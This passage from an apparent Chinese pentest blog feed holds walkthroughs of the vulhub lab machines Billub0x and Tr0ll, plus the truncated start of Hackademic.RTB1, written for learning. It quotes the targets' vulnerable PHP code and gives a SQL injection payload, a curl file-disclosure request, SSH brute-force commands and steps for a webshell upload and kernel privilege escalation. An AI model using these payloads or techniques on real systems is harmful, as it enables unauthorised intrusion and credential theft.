靶机总结</h2><ol><li>目录扫描：开启了smb服务、web服务、ssh服务</li><li>smb渗透：没有任何可以查看的共享文件&#x2F;目录</li><li>web渗透：通过盲注可拿到ssh登录凭据，绕过受限shell即可拿到立足点；或通过注入写马拿到www-data的立足点</li><li>提权：枚举发现mysql服务为root用户运行，且在网站配置文件拿到数据库root凭据，登录后在mysql库中发现已自带命令执行UDF函数，利用其反弹回root shell</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulhub Billub0x</title>
    <link href="/2024/03/28/Billub0x/"/>
    <url>/2024/03/28/Billub0x/</url>
    
    <content type="html"><![CDATA[<p>vulhub Billub0x walkthrough</p><h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155147.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155156.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155212.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155227.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155239.png" alt="image.png"></p><h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02 web渗透"></a>0x02 web渗透</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155252.png" alt="image.png"></p><blockquote><p>好像在考注入，先目录爆破：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155301.png" alt="image.png"></p><blockquote><p>in.php：phpinfo</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155310.png" alt="image.png"></p><blockquote><p>add.php：文件上传</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155318.png" alt="image.png"></p><blockquote><p>test.php：任意文件下载</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155324.png" alt="image.png"></p><blockquote><p>uploaded_images：图片保存路径</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155333.png" alt="image.png"></p><blockquote><p>下载注入和文件上传页面的源码：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155344.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155350.png" alt="image.png"></p><blockquote><p>判断从注入下手：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$uname</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;un&#x27;</span>]));                                    <span class="hljs-variable">$pass</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ps&#x27;</span>]));                                     <span class="hljs-variable">$run</span>=<span class="hljs-string">&#x27;select * from auth where  pass=\&#x27;&#x27;</span>.<span class="hljs-variable">$pass</span>.<span class="hljs-string">&#x27;\&#x27; and uname=\&#x27;&#x27;</span>.<span class="hljs-variable">$uname</span>.<span class="hljs-string">&#x27;\&#x27;&#x27;</span>;           <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$run</span>);      <br></code></pre></td></tr></table></figure><blockquote><p>单引号被事先转义，注入走不通，再看文件上传<br>从源码发现没有添加action标签指向地址，是空壳页面，再换<br>这次再将目录爆破时的其他php文件全下载</p></blockquote><blockquote><p>test.php：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155358.png" alt="image.png"></p><blockquote><p>应该存在文件包含，尝试：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155422.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155435.png" alt="image.png"></p><blockquote><p>shadow读不了，先放一边，看其他文件</p></blockquote><blockquote><p>in.php、show.php：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155443.png" alt="image.png"></p><blockquote><p>给一个continue参数：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155504.png" alt="image.png"></p><blockquote><p>拿到了两个user<br>再看其他文件</p></blockquote><blockquote><p>panel.php：主页面<br>页面逻辑：include对应功能页面，且参数可控</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;continue&#x27;</span>]))<br>&#123;<br><span class="hljs-variable">$dir</span>=<span class="hljs-title function_ invoke__">getcwd</span>();<br><span class="hljs-variable">$choice</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;./&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;load&#x27;</span>]);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$choice</span>===<span class="hljs-string">&#x27;add&#x27;</span>)<br>&#123;<br>       <span class="hljs-keyword">include</span>(<span class="hljs-variable">$dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$choice</span>.<span class="hljs-string">&#x27;.php&#x27;</span>);<br><span class="hljs-keyword">die</span>();<br>&#125;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$choice</span>===<span class="hljs-string">&#x27;show&#x27;</span>)<br>&#123;<br>        <br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$choice</span>.<span class="hljs-string">&#x27;.php&#x27;</span>);<br><span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;load&#x27;</span>]);<br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>文件上传功能：检查后缀、MIME</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;upload&#x27;</span>]))<br>&#123;<br><br><span class="hljs-variable">$name</span>=<span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-variable">$address</span>=<span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;address&#x27;</span>]);<br><span class="hljs-variable">$id</span>=<span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]))<br>&#123;<br><span class="hljs-variable">$iname</span>=<span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-variable">$r</span>=<span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],PATHINFO_EXTENSION);<br><span class="hljs-variable">$image</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpeg&#x27;</span>,<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$r</span>,<span class="hljs-variable">$image</span>))<br>&#123;<br><span class="hljs-variable">$finfo</span> = @<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">finfo</span>(FILEINFO_MIME); <br><span class="hljs-variable">$filetype</span> = @<span class="hljs-variable">$finfo</span>-&gt;<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/image\/jpeg/&#x27;</span>,<span class="hljs-variable">$filetype</span> )  || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/image\/png/&#x27;</span>,<span class="hljs-variable">$filetype</span> ) || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/image\/gif/&#x27;</span>,<span class="hljs-variable">$filetype</span> ))<br>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&#x27;uploaded_images/&#x27;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]))<br> &#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Uploaded successfully &quot;</span>;<br>  <span class="hljs-variable">$update</span>=<span class="hljs-string">&#x27;insert into users(name,address,image,id) values(\&#x27;&#x27;</span>.<span class="hljs-variable">$name</span>.<span class="hljs-string">&#x27;\&#x27;,\&#x27;&#x27;</span>.<span class="hljs-variable">$address</span>.<span class="hljs-string">&#x27;\&#x27;,\&#x27;&#x27;</span>.<span class="hljs-variable">$iname</span>.<span class="hljs-string">&#x27;\&#x27;, \&#x27;&#x27;</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">&#x27;\&#x27;)&#x27;</span>; <br> <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$update</span>);<br>  <br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;i told you dear, only png,jpg and gif file are allowed&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;only png,jpg and gif file are allowed&quot;</span>;<br><br>&#125;<br>     &#125;<br> &#125;<br></code></pre></td></tr></table></figure><blockquote><p>c.php：数据库配置文件</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155516.png" alt="image.png"></p><blockquote><p>前往phpmy登录phpmyadmin：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155526.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155546.png" alt="image.png"></p><blockquote><p>从auth表拿到了登录凭据：<code>biLLu@hEx_it</code></p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155552.png" alt="image.png"></p><blockquote><p>传内容为一句话的jpg文件，修改MIME：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155559.png" alt="image.png"></p><blockquote><p>尝试加mageic number：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155608.png" alt="image.png"></p><blockquote><p>成功上传</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155626.png" alt="image.png"></p><blockquote><p>因为panel页面的load参数有include，所以也没必要用解析漏洞了，直接包含：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155632.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155639.png" alt="image.png"></p><blockquote><p>发现居然有一堆disable_funs：<br> pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority</p></blockquote><blockquote><p>幸运的是反弹shell用的没ban全，测试发现可以curl出网：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155659.png" alt="image.png"></p><blockquote><p>拿到立足点</p></blockquote><h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><blockquote><p>基础向量枚举后无思路，感觉又是内核提权，跑linpeas：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155725.png" alt="image.png"></p><blockquote><p>3.13版本也对上了，优先尝试CVE-2015-1328，其次脏牛，最后其他</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155743.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155750.png" alt="image.png"></p><blockquote><p>成功提权</p></blockquote><h2 id="0x04-反思总结"><a href="#0x04-反思总结" class="headerlink" title="0x04 反思总结"></a>0x04 反思总结</h2><blockquote><ol><li>提供文件下载功能的test页面通过<code>curl</code>传参直接可以看到内容：</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X POST --data <span class="hljs-string">&quot;file=c.php&quot;</span> http://10.10.10.136/test.php<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155800.png" alt="image.png"></p><h3 id="转义-单引号逃逸注入"><a href="#转义-单引号逃逸注入" class="headerlink" title="转义-单引号逃逸注入"></a>转义-单引号逃逸注入</h3><blockquote><p>登录页面可以sql注入：将第一个参数的后引号转义，从而使第二个参数的前引号被闭合，导致第二个参数逃逸</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$uname</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;un&#x27;</span>]));                                    <span class="hljs-variable">$pass</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ps&#x27;</span>]));                                     <span class="hljs-variable">$run</span>=<span class="hljs-string">&#x27;select * from auth where  pass=\&#x27;&#x27;</span>.<span class="hljs-variable">$pass</span>.<span class="hljs-string">&#x27;\&#x27; and uname=\&#x27;&#x27;</span>.<span class="hljs-variable">$uname</span>.<span class="hljs-string">&#x27;\&#x27;&#x27;</span>;           <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$run</span>);      <br></code></pre></td></tr></table></figure><blockquote><p>查询语句：<br>select * from auth where pass&#x3D;’PASS’ and uname&#x3D;’NAME’</p></blockquote><blockquote><p>故让PASS的值为<code>\</code>，NAME的值为<code> or 1#</code>达成注入，写入后为：<br>select * from auth where pass&#x3D;’ \‘ and uname&#x3D;’ or 1#’<br><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155807.png" alt="image.png"></p></blockquote><h3 id="phpmyadmin配置文件获取"><a href="#phpmyadmin配置文件获取" class="headerlink" title="phpmyadmin配置文件获取"></a>phpmyadmin配置文件获取</h3><blockquote><p>本机的非预期提权方式，拿phpmyadmin配置文件，ssh root密码使用了与之相同的密码</p></blockquote><blockquote><p>配置文件获取方式：</p><ol><li>公开信息利用：常用敏感信息git项目<a href="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt">Auto_Wordlists&#x2F;wordlists&#x2F;file_inclusion_linux.txt at main · carlospolop&#x2F;Auto_Wordlists (github.com)</a></li></ol></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155815.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155824.png" alt="image.png"></p><blockquote><p>注：数据库的登录凭据不一定和phpmyadmin的相同，是映射关系</p></blockquote><blockquote><ol start="2"><li>问gpt：</li></ol></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155833.png" alt="image.png"></p><h2 id="0x05-靶机总结"><a href="#0x05-靶机总结" class="headerlink" title="0x05 靶机总结"></a>0x05 靶机总结</h2><ol><li>端口扫描：80 web、22 ssh</li><li>web渗透：目录爆破出各功能页面，由文件包含拿到全部源码，审计后发现phpmyadmin登录凭据，登录后拿到主页面登录凭据；使用文件上传功能传图片马，由文件包含点getshell</li><li>提权：linpeas枚举，发现内核为熟悉的3.13.0(ubuntu)，使用经典的37292.c成功提权</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulhub Tr0ll</title>
    <link href="/2024/03/28/Tr0ll/"/>
    <url>/2024/03/28/Tr0ll/</url>
    
    <content type="html"><![CDATA[<p>vulhub Tr0ll walkthrough</p><h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><blockquote><p>tcp：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143514.png" alt="image.png"></p><blockquote><p>udp：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143523.png" alt="image.png"></p><blockquote><p>详细信息扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143534.png" alt="image.png"></p><blockquote><p>ftp允许匿名登录，且有一个lol.pcap文件可写<br>操作系统为ubuntu<br>web服务有两个目录被扫出来，但什么也没有：<br><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143541.png" alt="image.png"></p></blockquote><blockquote><p>脚本扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143608.png" alt="image.png"></p><blockquote><p>脚本扫描没有暴露出什么信息<br>粗略的看了web服务，什么也没有，且ftp存在匿名登录<br>跑起目录爆破，开始ftp渗透：</p></blockquote><h2 id="0x02-ftp渗透"><a href="#0x02-ftp渗透" class="headerlink" title="0x02 ftp渗透"></a>0x02 ftp渗透</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143621.png" alt="image.png"></p><blockquote><p>注意：要用binary模式下数据包(二进制)文件！否则会损失内容！</p></blockquote><blockquote><p>PCAP（Packet Capture）文件是一种用于捕获网络数据包的文件格式。它包含了网络通信期间捕获到的数据包的详细信息，例如源地址、目标地址、数据包类型和传输协议。</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143632.png" alt="image.png"></p><blockquote><p>目录爆破没有结果，放心开始分析数据包：</p></blockquote><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143654.png" alt="image.png"></p><blockquote><p>追踪可疑的ftp数据流发现下载了一个<code>secret_stuff.txt</code>的文件</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143705.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143717.png" alt="image.png"></p><blockquote><p>获得了一个像web路径的单词<code>sup3rs3cr3tdirlol</code>，尝试访问：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143737.png" alt="image.png"></p><blockquote><p>得到一个二进制文件，就用wireshark打开：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143744.png" alt="image.png"></p><blockquote><p>让我们去找地址为0x0856BF的进程？</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143755.png" alt="image.png"></p><blockquote><p>猜测是找Identification为0x0856BF的数据包，但是没找到<br>以为是知识盲区看了wp，结果竟然还是web路径！</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143805.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143819.png" alt="image.png"></p><blockquote><p>得到好像是用户名的列表，爆破ftp和ssh中优先选择ssh：</p></blockquote><h3 id="ssh爆破"><a href="#ssh爆破" class="headerlink" title="ssh爆破"></a>ssh爆破</h3><blockquote><p>尝试密码喷射，以防用户名和密码有重叠：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crackmapexec ssh 10.10.10.135 -p user.txt -u user.txt  --continue-on-success | grep <span class="hljs-string">&#x27;+&#x27;</span> <br></code></pre></td></tr></table></figure><blockquote><p>hydra大字典爆破：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -L user.txt -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.135 ssh<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143839.png" alt="image.png"></p><blockquote><p>果然ssh不该大字典爆破<br>这里又看了wp，作者提示的密码居然是<code>Pass.txt</code>这个字符串…</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143903.png" alt="image.png"></p><blockquote><p>这脑洞没谁了…</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143911.png" alt="image.png"></p><h2 id="0x03-内核提权"><a href="#0x03-内核提权" class="headerlink" title="0x03 内核提权"></a>0x03 内核提权</h2><blockquote><p>linpeas枚举：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143931.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328144005.png" alt="image.png"></p><blockquote><p>linpeas枚举结果看出大概率内核提权，三个高可能项：CVE-2016-5195、CVE-2015-1328、CVE-2015-8660</p></blockquote><blockquote><p>先试脏牛CVE-2016-5195：</p><ol><li>40616编译成功，执行失败</li><li>34923编译失败</li><li>43345编译成功，执行失败</li></ol></blockquote><blockquote><p>试CVE-2015-1328，这个版本号、操作系统都对上了：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328144014.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328144052.png" alt="image.png"></p><blockquote><p>成功提权</p></blockquote><h2 id="0x04-反思总结"><a href="#0x04-反思总结" class="headerlink" title="0x04 反思总结"></a>0x04 反思总结</h2><blockquote><ol><li>拿到无明显特征文件(如本机的roflmao)时要用工具判断文件类型，而不是直接打开：</li></ol></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328144108.png" alt="image.png"></p><blockquote><p>可以直接执行，也可以用strings命令读数据（用于从一个二进制文件中提取可读的字符串）</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328144418.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328144441.png"></p><blockquote><ol start="2"><li>不管拿到什么奇怪的字符串都要勇于去试是不是web路径，即使是0x0856BF这种地址字符串</li></ol></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328144459.png" alt="image.png"></p><blockquote><ol start="3"><li>本机的rolfmao为32位ELF可执行文件，可执行文件可以用IDA反编译出源码：</li></ol></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328144519.png" alt="image.png"></p><h2 id="0x05-靶机总结"><a href="#0x05-靶机总结" class="headerlink" title="0x05 靶机总结"></a>0x05 靶机总结</h2><ol><li>端口扫描：ftp、web、ssh开启</li><li>ftp渗透：匿名登录拿到一个流量包，分析得到web路径，拿到ssh用户名和密码，获得了立足点</li><li>内核提权：linpeas枚举出可能的cve，多次分析尝试后成功提权</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulhub Hackademic.RTB1</title>
    <link href="/2024/03/28/Hackademic.RTB1/"/>
    <url>/2024/03/28/Hackademic.RTB1/</url>
    
    <content type="html"><![CDATA[<p>vulhub Hackademic.RTB1 walkthrough</p><h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><blockquote><p>主机发现：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328140855.png" alt="image.png"></p><blockquote><p>全端口扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328140903.png" alt="image.png"></p><blockquote><p>只开了80，udp扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328140911.png" alt="image.png"></p><blockquote><p>详细信息扫描+脚本扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328140923.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328140936.png" alt="image.png"></p><blockquote><p>好像开启了TRACE提交方法，开始web渗透：</p></blockquote><h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02 web渗透"></a>0x02 web渗透</h2><blockquote><p>先跑起目录爆破，看前端：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141100.png" alt="image.png"></p><blockquote><p>go root可点</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141100.png"></p><blockquote><p>可疑参数p，测试idor：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141121.png" alt="image.png"></p><blockquote><p>报出cms是wordpress 1.5.1.1<br>看目录爆破结果：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141134.png" alt="image.png"></p><blockquote><p>有phpmyadmin页面，也印证了应该是wordpress的cms，但是403了：</p></blockquote><p><img 